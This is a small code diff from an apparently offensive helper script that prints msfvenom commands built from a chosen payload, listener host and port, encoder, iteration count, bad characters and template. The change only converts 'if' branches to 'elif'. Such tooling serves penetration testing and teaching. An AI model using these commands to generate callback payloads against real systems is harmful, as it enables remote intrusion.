@@ -218,10 +218,10 @@ try:
                 if file == "x":
                     print("Your code: msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2))
                     break
-                if file == "o":
+                elif file == "o":
                     print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                     break
-                if file == "k":
+                elif file == "k":
                     print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                     break
                 else:
